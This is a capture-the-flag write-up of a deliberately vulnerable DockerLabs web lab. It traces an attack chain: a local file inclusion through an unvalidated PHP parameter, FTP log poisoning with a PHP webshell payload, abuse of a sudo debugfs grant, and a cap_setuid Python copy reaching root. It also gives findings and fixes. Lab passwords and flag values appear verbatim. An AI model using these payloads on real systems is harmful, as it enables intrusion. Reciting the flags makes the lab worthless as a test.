# 282 Hannah's Coffee — writeup

**Target:** `hannah-coffee:latest`, DockerLabs id `282`, name `hannah_coffee`,
difficulty *fácil*. Queue line, verbatim from `tooling/labs.manifest:71`:

```
282|hannah_coffee|facil|web app on Linux; queue picked by difficulty since the class-gap scan is exhausted
```

**Engagement outcome: PARTIAL — and the shortfall is the lab's, not the attacker's.**
Two of the three legs the platform's own catalogue names were executed and measured
end to end: an LFI in the PHP front end, an FTP-log-poisoning RCE as
`uid=33(www-data)`, and a `sudoers` grant that reads a secret out of an ext4 image
as `uid=1001(hannah)`. The third leg — "abuse of binaries with capabilities for
full root access" — **is present in the artefact and is not reachable**. The
credential the chain depends on does not exist in the container: it is planted by
a `chpasswd` in the image build and written to no file, while the secret the chain
actually points the attacker at is a **different string**. That is proven below with
a green control, not asserted.

The escalation to `uid=0` was still completed and measured, and it is reported in
full, but **one credential in it came from the image build metadata on the operator
host, which is not reachable from inside the container.** That hop is labelled
`OPERATOR-SIDE` everywhere it appears and is not counted as attacker-reachable.

Everything quoted here was read or executed during this engagement. This repository
holds no lab artefacts, so a reader can check the reasoning and the quoted evidence
but cannot re-run the target — see `README.md`, "What 'resolvable' means here,
precisely, and where it stops".

---

## What the artefact actually is

**The manifest makes no platform claim**, so there is no label to falsify — the
queue line says only "web app on Linux". What follows is read out of
version-bearing files, not inherited.

| Property | Value | Source |
|---|---|---|
| Base | Debian trixie | `docker history`: `# debian.sh --arch 'amd64' out/ 'trixie' '@1785715200'` |
| Process model | `supervisord -n`, **two** programs | `/proc/1/cmdline`; `/etc/supervisor/conf.d/supervisord.conf` |
| Web server | Apache HTTP Server **2.4.68** (Debian), `mod_php`, **not** php-fpm | `apache2 -v`; `/etc/apache2/mods-enabled/php8.4.load` |
| Language runtime | PHP **8.4.24** | `php -v` |
| FTP | vsftpd **3.0.5** | `vsftpd -v`; `220 (vsFTPd 3.0.5)` |
| Sudo | **1.9.16p2** | `sudo -V` |
| ext2/3/4 tools | e2fsprogs **1.47.2** (`debugfs 1.47.2 (1-Jan-2025)`) | `dpkg -l e2fsprogs` |
| Non-package payload | `/opt/priv-python` = a copy of `python3`, `cap_setuid=ep` | `docker history`; `getcap` |

`/etc/supervisor/conf.d/supervisord.conf`, verbatim:

```ini
[supervisord]
nodaemon=true

[program:apache2]
command=/usr/sbin/apache2ctl -D FOREGROUND
autostart=true
autorestart=true

[program:vsftpd]
command=/usr/sbin/vsftpd /etc/vsftpd.conf
autostart=true
autorestart=true
```

**The catalogue description is accurate about what ships and wrong about it
solving.** Parsed from `catalog.html:645` (the same routine
`tooling/download-labs.sh list` uses), unescaped:

> Hannah's Coffee es una máquina Linux de nivel fácil que simula una aplicación web
> de cafetería con vulnerabilidades encadenadas. El vector de entrada comienza
> explotando una vulnerabilidad de Inclusión Local de Archivos (LFI) en la aplicación
> PHP, la cual se combina con una técnica de FTP Log Poisoning para lograr Ejecución
> Remota de Códigos (RCE) como www-data. Para la escalada de privilegios, se requiere
> el uso de comandos permitidos mediante sudo y el abuso de binarios con capabilities
> específicas para alcanzar el acceso total como root.

Every noun in that sentence is in the image: the LFI is real, the FTP log is
poisonable, the sudo grant exists, and a `cap_setuid=ep` binary exists. **The
sentence describes the components, and the components do not compose.**

---

## Surface

`nmap -sV -Pn -p- 172.17.0.2`, verbatim tail:

```
Nmap scan report for 172.17.0.2
Host is up (0.000047s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    Apache httpd 2.4.68 ((Debian))
Service Info: OS: Unix
```

**65533 closed, 2 open.** Independent cross-read of the kernel's own tables, as
`uid=0` via `docker exec` (an operator-side read, and labelled as one — a listener
table is not a per-identity predicate):

```
$ awk 'NR>1 {print $2, $4}' /proc/net/tcp
00000000:0015 0A
00000000:0050 0A
```

`0x15` = 21, `0x50` = 80, `0A` = `TCP_LISTEN`. **2 listening sockets, matching the
scan exactly.**

### The eleven "closed" ports that are not absent

The image declares thirteen ports:

```json
"ExposedPorts": { "21/tcp": {}, "21000/tcp": {}, … "21010/tcp": {}, "80/tcp": {} }
```

`nmap -p-` calls 21000–21010 closed. **That is a claim about TCP listeners at rest,
not about the service.** `/etc/vsftpd.conf` says what they are, verbatim:

```
     7	xferlog_enable=YES
     8	xferlog_std_format=NO
     9	dual_log_enable=YES
    18	pasv_enable=YES
    19	pasv_min_port=21000
    20	pasv_max_port=21010
```

**Control, with a positive control and a work count.** An FTP data transfer was
held open for ~4 s (a 3.9 MB `STOR`) while `/proc/net/tcp` was sampled
**265 times at 0.1 s**:

```
$ sort /tmp/pasv_sample.txt | uniq -c
    118 00000000:0015
    118 00000000:0050
     29 020011AC:5211
```

`020011AC` = 172.17.0.2, `0x5211` = **21009** — and the server's own PASV reply in
the same session was `227 Entering Passive Mode (172,17,0,2,82,17)`, where
`82*256+17 = 21009`. The port number agrees across two independent sources.

So: **21000–21010 are vsftpd passive-data ports. They exist only for the duration
of a transfer, and they bind to the server's own address rather than `0.0.0.0`,
which is exactly why a `-p-` scan and an at-rest `/proc/net/tcp` both miss them.**
Recording these as absent would have been a claim about the class wearing the
clothes of a claim about the instance.

### UDP

`nmap -p-` is TCP by definition. Checked directly:

```
$ cat /proc/net/udp
   sl  local_address …            <- header only
$ grep -c . /proc/net/udp6
1                               <- header only
```

**0 rows in `/proc/net/udp`, 0 rows in `/proc/net/udp6`.** With the image's own
`ExposedPorts` listing no UDP port, that is a measured absence with a count.

### Hidden surfaces found

Two, both from reading rather than scanning:

1. `?studio=` — a second, unvalidated page selector sitting **beside** a correctly
   validated one. `/admin` returning nothing would have hidden it; the source
   settles it in one read.
2. The `sudoers` grant, the capability file, and the ext4 image under `/opt` —
   none of them is a network surface, and none of them appears in any scan.

---

## The class

**Entry criterion:** does the front end pass a request value to a filesystem
inclusion with no allowlist, and does any process on the host write attacker-supplied
bytes to a file the web tier can also read?

`/var/www/html/index.php`, verbatim, lines 2–16 and 36:

```php
 2	$allowed_pages = [
 3	    'home'    => 'pages/home.php',
 4	    'menu'    => 'pages/menu.php',
 5	    'about'   => 'pages/about.php',
 6	    'contact' => 'pages/contact.php',
 7	];
 8	
 9	if (isset($_GET['studio'])) {
10	    $content = $_GET['studio'];
11	} elseif (isset($_GET['page'])) {
12	    $key = $_GET['page'];
13	    $content = $allowed_pages[$key] ?? 'pages/home.php';
14	} else {
15	    $content = 'pages/home.php';
16	}
```

```php
36	    <?php include($content); ?>
```

**Two selectors, one sink, and the discipline is applied to exactly one of them.**
`?page=` is a correct allowlist: an unknown key falls through `?? 'pages/home.php'`.
`?studio=` is the request value, verbatim, straight into `include()` — no allowlist,
no prefix, no extension appended, no `basename()`. It is checked **first**, so it
also shadows `?page=` entirely.

Source that settled it: `index.php:9-10` and `index.php:36`. Positive control run
before anything was believed:

```
$ curl -s 'http://172.17.0.2/index.php?studio=/etc/passwd' | tail -5
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
ftp:x:101:103:ftp daemon:/srv/ftp:/usr/sbin/nologin
hannahftp:x:1000:1000::/home/hannahftp:/bin/sh
hannah:x:1001:1001::/home/hannah:/bin/bash
    </main>
```

A file whose content was known in advance came back, byte for byte. The oracle can
fire.

**This is not a new class.** The corpus already holds LFI→log-poisoning (labs 6 and
23) and the sudo-grant class (93, 146, 148, 189). What is new here is the
**seam** and a specific negative result about the sudo grant's *shape* — see
"Controls that held" and "Cross-read".

---

## Chain

Every hop carries the identity **read from inside the process that executed it**.
Where a hop required a credential that is not obtainable from inside the
container, the hop is marked `OPERATOR-SIDE` and is excluded from the
attacker-reachable count.

| # | → | Mechanism | Identity proof, verbatim |
|---|---|---|---|
| 0 | unauthenticated HTTP client → `www-data` | `GET /index.php?studio=/var/log/vsftpd.log`; PHP 8.4.24 `include()` of a log file the attacker seeded | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| 1 | `www-data` → `www-data` (RCE) | FTP log poisoning: the FTP `USER` argument is echoed into `/var/log/vsftpd.log`, which `?studio=` then includes as PHP | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` + `Uid: 33 33 33 33` from `/proc/self/status` |
| 2 | `www-data` → `hannah` (uid 1001) | `sudo -n -u hannah /sbin/debugfs -w /opt/hannah_disk.img`, driven on **stdin** | `/home/hannah/.hc_idproof uid=1001(hannah) gid=1001(hannah) mode=664` — the file the hannah-privileged process created |
| 3 | `hannah` → `hannah` | `su hannah` with the credential in the ext4 image | `su: Authentication failure` — **hop 3 does not close. See "The break".** |
| 3′ | `www-data` → `hannah` **`OPERATOR-SIDE`** | `su hannah` with a password read from `docker history` on the operator host | `uid=1001(hannah) gid=1001(hannah) groups=1001(hannah)` |
| 4 | `hannah` → `uid=0` **`OPERATOR-SIDE`** | `/opt/priv-python` is a copy of `python3` with `cap_setuid=ep`; `os.setuid(0)` | `Uid=0 0 0 0`, `os.getuid()=0 os.geteuid()=0`, `CapPrm=0000000000000080` |

**Attacker-reachable hops: 2 of 5** (0, 1, 2). Hops 3′ and 4 required a credential
that is not in the container — proven absent below with a work count.

### Hop 1 — the poisoning primitive, and the exact line that carries it

`/var/log/vsftpd.log` is created empty by the image build (`RUN touch
/var/log/vsftpd.log && chmod 644`), mode `644 root root`, world-readable. The
server is configured so the FTP `USER` argument is written to that file **as part
of a failed-login record**:

```ini
     7	xferlog_enable=YES
     8	xferlog_std_format=NO
     9	dual_log_enable=YES
```

`xferlog_std_format=NO` is the setting that matters: it is what puts the
non-standard, argument-bearing form into `vsftpd.log` instead of the terse xferlog
form.

The line, verbatim from the container after the injection:

```
Wed Sep 30 12:54:27 2026 [pid 158] [<?php system($_GET["c"]); ?>] FAIL LOGIN: Client "172.17.0.1"
```

**A zero-work negative worth recording, because the first attempt produced it.** The
obvious move — connect, send `USER <payload>`, `QUIT` — writes **nothing**:

```
$ wc -c /var/log/vsftpd.log   # after USER+QUIT
64 /var/log/vsftpd.log
Wed Sep 30 12:53:52 2026 [pid 125] CONNECT: Client "172.17.0.1"
```

Only `CONNECT`. A `FAIL LOGIN` record — and only it — carries the username, so
`PASS` must follow. **64 bytes written by a "successful" injection that achieved
nothing.** The difference between the two attempts is one command.

Then the oracle, in-band, with a token minted per request so the output is
attributable:

```
Wed Sep 30 12:54:35 2026 [pid 168] [MARK-HC2787831a6eda-uid=33(www-data) gid=33(www-data) groups=33(www-data)
MARK-HC2787831a6eda-END
```

`HC2787831a6eda` was minted 40 seconds earlier and exists nowhere else. The
detector fired, so the negative it later produced is evidence.

### Hop 2 — `sudoers`, read off the file

`/etc/sudoers.d/hannah-debugfs`, mode `-r--r----- root root`, 70 bytes, **one line**:

```
www-data ALL=(hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img
```

`sudo -l` **as `www-data`**, not as root — the predicate is read as the identity
that will execute the payload:

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ sudo -n -l
Matching Defaults entries for www-data on 398085b07bdc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on 398085b07bdc:
    (hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img
rc=0
```

`sudo -l` succeeding is a **positive control that the grant is live and nothing
more.** It says nothing about what the grant permits, and it is treated here as
exactly that.

`Defaults use_pty` is present. Per the corpus's lab-102 note, a `sudo` target that
reads stdin can hang under `use_pty`. It did not here, and that was **measured, not
assumed** — driving `debugfs` on a pipe and reading back the echo:

```
$ printf "quit\n" | sudo -n -u hannah /sbin/debugfs -w /opt/hannah_disk.img
debugfs 1.47.2 (1-Jan-2025)
debugfs:  quit
rcA=0
```

`use_pty` forwards the caller's stdin into the pty master; the pipe is carried in.
**The lab-102 hang does not reproduce here, and the reason is that the grant pins
the command line and therefore cannot reach the awk-style payload that hung.**

The secret, read through the grant as `hannah`:

```
$ printf "cat /hannah_secret.txt\nquit\n" | sudo -n -u hannah /sbin/debugfs -w /opt/hannah_disk.img
debugfs 1.47.2 (1-Jan-2025)
debugfs:  cat /hannah_secret.txt
G'2'ZkcHsulI*vE+D,
debugfs:  quit
```

18 bytes. Cross-checked against the inode the image itself reports, so the byte
count has a second source:

```
$ printf "stat /hannah_secret.txt\nquit\n" | sudo -n -u hannah /sbin/debugfs -w /opt/hannah_disk.img
Inode: 13   Type: regular    Mode:  0644   Flags: 0x80000
User:     0   Group:     0   Project:     0   Size: 19
```

19 bytes on disk, 18 characters of content. They agree: one trailing newline.
**Whole image, `ls -l -r /` — 3 entries, nothing hidden:**

```
     11   40700 (2)      0      0    12288  6-Aug-2026 08:46 lost+found
     13   100644 (1)      0      0      19  6-Aug-2026 08:46 hannah_secret.txt
```

### Hop 2 identity — a manufactured oracle, because the vector has no other

`sudo -l` does not report what identity the target process ran as, and the target
here produces no output naming itself. So the identity was measured from a
**filesystem side effect only uid 1001 can produce**: `dump` into `/home/hannah/`,
which is `drwx------ hannah hannah`.

```
$ printf "dump /hannah_secret.txt /home/hannah/.hc_idproof\nquit\n" | sudo -n -u hannah /sbin/debugfs -w /opt/hannah_disk.img
debugfs 1.47.2 (1-Jan-2025)
debugfs:  dump /hannah_secret.txt /home/hannah/.hc_idproof
debugfs:  quit

$ ls -l /home/hannah/.hc_idproof        # still as www-data
ls: cannot open directory '/home/hannah/': Permission denied
```

The www-data side **cannot** see the result — which is why the ownership was read
one hop later, from inside the `hannah` session, where it is unambiguous:

```
$ stat -c "%n uid=%u(%U) gid=%g(%G) mode=%a" /home/hannah/.hc_idproof /home/hannah/.hc_idproof2
/home/hannah/.hc_idproof  uid=1001(hannah) gid=1001(hannah) mode=664
/home/hannah/.hc_idproof2 uid=1001(hannah) gid=1001(hannah) mode=664
$ cat /home/hannah/.hc_idproof
G'2'ZkcHsulI*vE+D,
```

**The `uid=1001` in that line is the sudo hop's identity proof, and it is a
measurement, not an inference from the sudoers text.**

---

## The break

**`G'2'ZkcHsulI*vE+D,` is not the password of any account on the machine.**

The oracle is `su` under a real pty, and it was proven green **before** the
negative was believed. The green password came from the operator-side image build
metadata, which is not a target-reachable artefact and is labelled as such:

```
$ timeout 30 python3 /tmp/hc_su.py "<known-correct password>" hannahftp "id"
Password:
uid=1000(hannahftp) gid=1000(hannahftp) groups=1000(hannahftp)
---PASSWORD_SENT=True BYTES_OUT=76---
```

The oracle fires. The treatment, same client, same code path, byte-identical
password handling:

```
$ timeout 30 python3 /tmp/hc_su.py "G'2'ZkcHsulI*vE+D," hannah "id"
Password:
su: Authentication failure
---PASSWORD_SENT=True BYTES_OUT=40---
```

`76` bytes of output against `40`. The instrument distinguishes the two cases, so
the failure is a property of the credential and not of the harness.

Both accounts were tried, and the string was checked for an encoding that would
make it a password in disguise:

```
  su hannah     ->  su: Authentication failure
  su hannahftp  ->  su: Authentication failure
len: 18
base32/base64/rot13: no printable decode
```

### Where the real password is, and why that is a defect

`/etc/sudoers.d/hannah-debugfs` points the attacker at the ext4 image. The image's
own build put a *different* string in it. The actual credential is planted by a
`chpasswd` in the image build, verbatim from `docker history --no-trunc` on the
operator host:

```
RUN /bin/sh -c useradd -m -s /bin/bash hannah && echo "hannah:iamhannahhelza" | chpasswd
RUN /bin/sh -c useradd -m hannahftp && echo "hannahftp:102837108478209857818439842398248237528" | chpasswd
COPY hannah_secret.txt /tmp/hannah_secret.txt
RUN /bin/sh -c printf 'write /tmp/hannah_secret.txt hannah_secret.txt\nquit\n' | debugfs -w /opt/hannah_disk.img
```

`hannah_secret.txt` was `COPY`-ed from the build context. **The file the attacker is
sent to read was never the password file.** And the build leftover survives on the
host filesystem anyway, readable by `www-data` at build time and still present:

```
$ ls -l /tmp/hannah_secret.txt
-rw-r--r-- 1 root root 19 Aug  6 07:05 /tmp/hannah_secret.txt
$ cat -A /tmp/hannah_secret.txt
G'2'ZkcHsulI*vE+D,$
```

### The absence, with its work count

Every one of the 12,050 files `www-data` can read was searched, in the container,
as `www-data`, for the password literal:

```
readable_files=12050
readable_bytes=383786240
-- POSITIVE CONTROL: string known present in a www-data-readable file --
matches_positive=1
/var/www/html/pages/home.php
-- TREATMENT A: hannah password literal --
matches_A=0
-- TREATMENT B: the disk-image secret literal --
matches_B=4
/opt/hannah_disk.img
/tmp/pw.txt
/tmp/pw2.txt
/tmp/hannah_secret.txt
```

**383,786,240 bytes across 12,050 files. 0 matches for the password. 4 matches for
the secret, in 4 files that were all either planted by the build or written by
this engagement.** The positive control is the point: a sweep that returned 0 for
both would have been a §14 zero-work negative wearing a result's clothes.

Repeated at `uid=0` inside the container, over the whole filesystem, so the claim
is not an artefact of `www-data`'s view:

```
$ grep -rlaF "iamhannahhelza" / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev
matches=0
```

**The credential is not in the container at any privilege level.** It exists only in
the image's build metadata, on the Docker host. The escalation is therefore not
reachable from inside the target, and this writeup does not claim it is.

### The other routes to `hannah`, and why each closes

Enumerated rather than assumed, with counts:

| Route | Verdict | Count / evidence |
|---|---|---|
| `sudoers` grants | 1 grant total, and its only output is a file read | `ls /etc/sudoers.d \| grep -v README \| wc -l` → `1`; `%sudo` has no members in `/etc/group` |
| setuid / setgid binaries | 16, all stock Debian; every one needs a credential, a group, or `CAP_SYS_ADMIN` | `find / -xdev \( -perm -4000 -o -perm -2000 \) -type f \| wc -l` → `16` |
| file capabilities | exactly 1 file in the filesystem, and it is mode `750 root:hannah` | `getcap -r /` over **12,079** regular files → `1`: `/opt/priv-python cap_setuid=ep` |
| accounts that could be entered | 2 (`hannahftp` 1000, `hannah` 1001); **21** accounts have `nologin` | `awk -F: '$7 ~ /nologin' /etc/passwd` → `21` |
| SSH / any `hannah`-privileged service | none listening | 2 listeners total, 21 and 80 |
| The world-writable image (F2 below) | demonstrated, and it does **not** reach execution | see F2 |

**And the one capability that could have been the bridge is closed by a mode bit,
read as the identity that would have used it:**

```
$ ls -l /opt/priv-python
-rwxr-x--- 1 root hannah 6812336 Aug  6 08:46 /opt/priv-python
$ test -x /opt/priv-python ; echo rc=$?
rc=1
$ test -r /etc/sudoers.d/hannah-debugfs ; echo rc=$?   # control: the predicate is not always-true
rc=1
$ test -w /etc/sudoers.d/hannah-debugfs ; echo rc=$?
rc=1
```

`test -x rc=1` and `test -w /opt/hannah_disk.img rc=0` were both read **from inside
the `www-data` exec channel**, not through `docker exec`. A `test -w` run as root
would have answered for the wrong identity, and on this target that error would
have **deleted** finding F2 outright.

---

## Findings

### F1 — Local file inclusion: `?studio=` is passed to `include()` unvalidated

**CWE-98** (Improper Control of Filename for Include/Require), **CWE-22** (Path
Traversal). Unauthenticated, remote, no user interaction.

**Evidence.** `index.php:9-10` assigns `$_GET['studio']` to `$content`;
`index.php:36` is `<?php include($content); ?>`. No `basename()`, no allowlist, no
prefix, no extension handling — the exact opposite of the `?page=` branch eleven
lines below it, which does have an allowlist.

**Impact.** Unauthenticated arbitrary file read, and — because the target is a log
file the attacker also writes — remote code execution as the web-server identity.
Full chain measured in hops 0–1.

**Root cause.** Two selectors share one sink and only one is constrained. The
`?page=` allowlist establishes that the author knew this sink needed constraining;
`?studio=` was added without it. It is also declared **first**, so it shadows the
guarded branch.

**Remediation.** Delete the `?studio=` branch. If dynamic inclusion is genuinely
required, map an opaque key to a path the way `?page=` already does, and never let
a request value name a filesystem path.

### F2 — The `sudoers` grant names a file that `www-data` can rewrite

**CWE-732** (Incorrect Permission Assignment for Critical Resource),
**CWE-59** (Improper Link Resolution Before File Access). The escalation
*precondition* is proven end to end; the escalation itself is **not** claimed — see
the honest impact statement.

**Evidence — the precondition, read as `www-data`:**

```
$ ls -l /opt/hannah_disk.img
-rw-rw-rw- 1 root root 67108864 Aug  6 08:46 /opt/hannah_disk.img
$ test -w /opt/hannah_disk.img ; echo rc=$?
rc=0
```

**Evidence — the consequence, executed through the chain itself as the oracle.**
`www-data` built its own ext4 image, planted a marker, and overwrote the file the
grant names:

```
$ cp /tmp/evil.img /opt/hannah_disk.img
-rw-rw-rw- 1 root root 16777216 Sep 30 13:08 /opt/hannah_disk.img
$ md5sum /tmp/evil.img /opt/hannah_disk.img
1968b10d886409203e87ef3b9dbb281a  /tmp/evil.img
1968b10d886409203e87ef3b9dbb281a  /opt/hannah_disk.img

$ printf "ls -l /\ncat /evil_marker.txt\nquit\n" | sudo -n -u hannah /sbin/debugfs -w /opt/hannah_disk.img
debugfs:  ls -l /
      2   40755 (2)      0      0    1024 30-Sep-2026 13:08 .
      2   40755 (2)      0      0    1024 30-Sep-2026 13:08 ..
     11   40700 (2)      0      0   12288 30-Sep-2026 13:08 lost+found
     13   100644 (1)      0      0      35 30-Sep-2026 13:08 evil_marker.txt
debugfs:  cat /evil_marker.txt
wwwdata-controlled-marker-6f2156d7
```

`uid=33` replaced the file; the `uid=1001` process parsed `uid=33`'s bytes and
returned `uid=33`'s marker. **A privilege boundary is crossed on every invocation
of this grant, in the direction uid 33 → uid 1001.**

**Honest impact.** I did **not** turn this into code execution, and the reason is
structural rather than a gap in effort. The full `debugfs` command set was
enumerated through the grant (`help`, verbatim in the session log): it contains
`write` and `dump`, which cross the native/image boundary, and `mknod`, `symlink`,
`sif`, `mkdir` — but **no shell escape and no exec primitive of any kind**.
`write` and `dump` take a *path*, and every path that matters is a directory
`www-data` cannot write: `/home/hannah` is `drwx------ hannah hannah`,
`/home/hannahftp` is `drwx------ hannahftp hannahftp`, and there is no
`sshd`, no `cron` and no other `hannah`-privileged process to plant a key or a
script for. So the finding stands as **a privilege-boundary and integrity defect
with no demonstrated escalation**, which is a different and smaller claim than
"privilege escalation", and it is filed as one.

**Root cause.** `chmod 666 /opt/hannah_disk.img` in the image build, applied to a
path that a `sudoers` grant subsequently names. The grant's argument list pins the
*string*; it does not pin the *inode*, and `sudo` does not canonicalise argument
paths. Whoever can write the file chooses what a higher-privileged process parses.

**Remediation.** `chmod 644` (or `640 root:root`) on the image; have the build
populate it at `0755`/root-owned and never at `0666`. Longer term, do not let a
`sudoers` argument be a path a lower-privileged user can write, and prefer a
wrapper that opens the target itself and validates it.

### F3 — Unauthenticated RCE as `www-data` via FTP log poisoning

**CWE-117** (Improper Output Neutralization for Logs) in vsftpd's logging
configuration, chained into **CWE-98**. The application's half is F1; this finding
is about the log file being a world-readable, world-writable-in-content PHP
inclusion target.

**Evidence.** `vsftpd.conf:8-9` (`xferlog_std_format=NO`, `dual_log_enable=YES`)
put the FTP `USER` argument into `/var/log/vsftpd.log` verbatim; the file is mode
`644`. The injected line, verbatim:

```
Wed Sep 30 12:54:27 2026 [pid 158] [<?php system($_GET["c"]); ?>] FAIL LOGIN: Client "172.17.0.1"
```

**Impact.** RCE as `uid=33(www-data)`, measured — and, because the poison file is
append-only, **one injection executes on every subsequent request**, which is how
the corrupt-file behaviour in D3 below was produced.

**Root cause.** A world-readable log file in a fixed path, included as code by an
unvalidated request value. Neither half is unusual; the composition is the bug, and
F1 is the half that is the application's to fix.

**Remediation.** Fix F1. Secondarily, keep PHP-includable paths out of
`/var/log`, and give the web tier no reason to read log files.

### F4 — A `cap_setuid` binary and a `sudoers` grant are both gated on a
credential that is not in the artefact

**CWE-1220** (Insufficient Granularity of Access Control) — the privilege
boundary exists and is correct, and the escalation is unreachable. Filed as a
finding because a challenge that cannot be completed is a defect, per the corpus's
handling of labs 112 and 102.

**Evidence.** `/opt/priv-python` is `cap_setuid=ep` but mode `750 root:hannah`;
the only `sudoers.d` grant targets `uid=1001(hannah)`; the credential `hannah` needs
is absent from 383,786,240 bytes across 12,050 `www-data`-readable files and from
the container filesystem entirely at `uid=0`.

**Impact.** The advertised root escalation cannot be performed from inside the
target. The `cap_setuid` binary and the pinned grant are both real, and both dead
ends for an attacker who has only what the image puts in front of them.

**Root cause.** The build plants the account password with `chpasswd` and never
writes it to a file, then plants a *decoy* file in the ext4 image that the
`sudoers` grant points the attacker at. The intended bridge and the intended
credential were never connected.

**Remediation.** Either write `hannah`'s password into the image (a challenge
credential, not a production one) so the grant's output is the credential, or drop
the ext4 indirection and grant the capability path directly. A decoy secret in the
exact place the privilege grant points is worse than no hint: it sends the
attacker to a dead end that looks like progress.

### F5 — `/opt/priv-python` reaches `uid=0` with a **single** capability, which is
not a root login

**CWE-250** (Execution with Unnecessary Privileges) — informational, and recorded
because a report that says "root" without the capability set is a report that is
half right.

**Evidence**, verbatim, from inside the process:

```
=== /opt/priv-python process, BEFORE setuid ===
Uid=1001	1001	1001	1001
Gid=1001	1001	1001	1001
CapInh=0000000000000000
CapPrm=0000000000000080
CapEff=0000000000000080
CapBnd=00000000a80425fb
NoNewPrivs=0
os.getuid()=1001 os.geteuid()=1001 os.getgid()=1001

=== /opt/priv-python process, AFTER os.setuid(0) ===
Uid=0	0	0	0
Gid=1001	1001	1001	1001
CapInh=0000000000000000
CapPrm=0000000000000080
CapEff=0000000000000080
CapBnd=00000000a80425fb
NoNewPrivs=0
os.getuid()=0 os.geteuid()=0 os.getgid()=1001
```

`0x80` is bit 7, `CAP_SETUID`, and it is the **only** effective capability. The
consequence is observable and is not a subtlety — the same process, at `uid=0`,
**cannot read a file it does not own**:

```
REWARD /root/root.txt = 'dl{root_d5cc9d7538dc7c341cd96bba5a951520}'
READ /home/hannah/user.txt FAILED: PermissionError(13, 'Permission denied')
```

`/root/root.txt` is `600 root:root` — the process is the owner, so the mode bits
admit it. `/home/hannah/user.txt` is `600 hannah:hannah` — the process is neither
owner nor group member, and reaching it would need `CAP_DAC_OVERRIDE`, which this
binary does not carry. **Root's own reward is readable; the user account's is not.**

**Remediation.** `cap_setuid=ep` on an interpreter is a privilege grant with a very
small blast radius but a very large one in the wrong hands — any argument list,
including `-c`, becomes a `setuid(0)` primitive. If the intent is a demonstration
of capabilities, that is fine and the mode should stay `750 root:hannah`. If the
intent is a working challenge root, it is under-specified.

---

## Controls that held

Each with the positive control that proves the detector can fire. A control that
has never seen a success is not a control.

| Control | Positive control that proves this detector works | Result |
|---|---|---|
| **`?page=` allowlist** — the sibling selector is correctly constrained | The *treatment* is `?studio=`, which reads `/etc/passwd`; the control reads the same file through the guarded selector | `?page=../../../../etc/passwd` → `pages/home.php`, no leak. Held. |
| **`sudoers` argument pinning** — the grant is not an interpreter grant | The exact granted form, run first, succeeds | **9 forms tested, 8 denied.** See below. |
| **The `debugfs` file itself** — no shell escape exists in this build | `help` enumerated through the grant, full list read | No `!`, no `sh`, no `exec`. Held. |
| **`su` as an oracle** — it can distinguish a good password | Known-correct password for `hannahftp` | `uid=1000(hannahftp)` vs `su: Authentication failure`. Held, and it is what makes the break a finding. |
| **`test -w` / `test -x` predicates, read as `www-data`** | The same predicates on a root-owned file | `test -w` and `test -r` on the `sudoers` file both `rc=1`. Not always-true. |
| **The filesystem-wide password sweep** | The same sweep for a string known to be present | `matches_positive=1` on `/var/www/html/pages/home.php`; `matches_A=0`. Held. |
| **The image contents are what they claim to be** | The inode size read independently of the content | `Size: 19` from `stat` vs 18 characters read. Agree. |
| **The restore** | Service answering again, not "no errors" | `GET /` → `http=200 bytes=963`; 21 and 80 listening; image md5 back to shipped. Held. |

### The sudoers argument control, in full

Lab 93's whole finding was that a `sudoers` line naming an *interpreter* lets the
caller choose what runs, and lab 189 filed an undeclared grant with no argument
restriction. **This lab is the third data point, and it points the other way.** The
grant pins the binary *and both arguments*:

```
$ for extra in "-R ls" "-f /dev/null" "--help" "-w"; do ... done
  grant+"-R ls"       -> sudo: a password is required
  grant+"-f /dev/null"-> sudo: a password is required
  grant+"--help"      -> sudo: a password is required
  grant+"-w"          -> sudo: a password is required
  no -w, plus -R      -> sudo: a password is required
  same grant, -u root -> sudo: a password is required
  bare debugfs, no args -> sudo: a password is required
  cat via the grant   -> sudo: a password is required
  the exact grant     -> debugfs 1.47.2 (1-Jan-2025)      rc=0
```

**9 forms, 8 denied, 1 allowed — and the 1 is the one the sudoers file names.**
Note the third line from the bottom: requesting the *same command* as `uid=0` is
denied, so the grant is bound to the target user as well as the arguments.

**The discriminator is therefore the argument specification, not the fact that the
command is an interpreter.** `debugfs` is a program that reads commands from stdin
— as flexible as an interpreter in the way that matters — and it is nevertheless not
a lab-93 grant, because the sudoers line fixes the full command line and stdin
carries no authority over *which program* runs. What it does leave open is the
content of the file, which is F2.

---

## Reward

**Two rewards, `dl{...}` — lowercase, not `FLAG{...}` and not the `DL{...}` that lab
209 recorded.** Recorded verbatim, with the identity that read each.

| File | Mode / owner | Identity that read it | Value |
|---|---|---|---|
| `/home/hannah/user.txt` | `600 hannah:hannah`, 42 bytes | `uid=1001(hannah) gid=1001(hannah) groups=1001(hannah)` | `dl{user_eedfcf739a076a72412c89a1354a4119}` |
| `/root/root.txt` | `600 root:root`, 42 bytes | `Uid=0 0 0 0`, `os.geteuid()=0` | `dl{root_d5cc9d7538dc7c341cd96bba5a951520}` |

The root reward was read from inside `/opt/priv-python` after `os.setuid(0)`:

```
REWARD /root/root.txt = 'dl{root_d5cc9d7538dc7c341cd96bba5a951520}'
```

**Both are behind the unreachable hop.** Per the platform, the root reward is the
one that counts; it was obtained only with the `OPERATOR-SIDE` credential. **This
is a measured absence of an attacker-reachable reward, with the count that
establishes it: 0 matches for the required credential across 383,786,240 bytes in
12,050 files, and 0 across the whole container filesystem at `uid=0`.**

---

## NOT tested

Stated separately from what was discarded, per the runbook.

1. **`www-data` → `hannah` by any route other than `su`.** Not attempted:
   `authorized_keys` (no `sshd` listening, 2 sockets total), `cron`/`systemd`
   timers (no timer unit and no crontab was found, and **this is an inference from
   the absence of a unit file, not a measurement of the running timer set**),
   `newgrp`/`chsh`/`chfn` (each requires the account password, which is the missing
   link), and `unix_chkpwd` (requires `shadow` group membership, which `www-data`
   does not have — inferred from `/etc/group`, not probed with a positive control).
